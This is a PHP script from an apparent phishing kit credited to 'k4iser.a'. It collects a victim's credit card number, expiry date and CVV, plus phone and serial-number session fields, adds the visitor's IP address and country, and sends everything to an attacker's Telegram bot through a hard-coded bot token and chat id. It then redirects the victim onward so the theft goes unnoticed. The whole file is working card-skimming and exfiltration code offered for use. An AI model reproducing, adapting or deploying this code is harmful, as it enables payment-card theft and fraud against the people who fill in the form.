<?php
session_start();

$cc=$_POST["cc"];
$date=$_POST["date"];
$cvv=$_POST["cvv"];


$rand=rand(1000000,999999999).rand(1000000,999999999);
$rand2=base64_encode($rand);
	
        $_SESSION['cc'] = $cc;
        $_SESSION['date'] = $date;
        $_SESSION['cvv'] = $cvv;

        
    function getIPAddress() {  
    //whether ip is from the share internet  
     if(!empty($_SERVER['HTTP_CLIENT_IP'])) {  
                $ip = $_SERVER['HTTP_CLIENT_IP'];  
        }  
    //whether ip is from the proxy  
    elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {  
                $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];  
     }  
//whether ip is from the remote address  
    else{  
             $ip = $_SERVER['REMOTE_ADDR'];  
     }  
     return $ip;  
}  
$ip = getIPAddress();  
$iptolocation = 'http://api.hostip.info/country.php?ip=' . $ip;
$blad = file_get_contents($iptolocation);
$t=time();
$w9t = date("h:i:sa");
$ipdat = @json_decode(file_get_contents(
    "http://www.geoplugin.net/json.gp?ip=" . $ip));
	
	

$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message .= "~ Coded By k4iser.a  ~\n";
$message .= "|----------|INFO  NOR |----------|\n";
$message .= "Phone  : ".$_SESSION['phone']."\n";
$message .= "Serie Number  : ".$_SESSION['dob']."\n";
$message .= "|----------|CC  NOR |----------|\n";
$message .= "Card Number  : ".$_SESSION['cc']."\n";
$message .= "Date Exp  : ".$_SESSION['date']."\n";
$message .= "CVV  : ".$_SESSION['cvv']."\n";
$message .= "|------------------+|IP|-------------------|\n";
$message .= "IP : $ip | COUNTRY : $ipdat->geoplugin_countryName \n";
$subject = "~ <Rslt- NOR>- Coded By k4iser.a ~ | $ip";


$token = "6520712149:AAHeVzmz0NP_Cr4iOQKG6ZcOAg_nAEcuAZM";
    file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=-4091871371&text=" . urlencode($message)."" );
header("location:accept.php?vc?__event=card&service_id=top_card=ML")
?>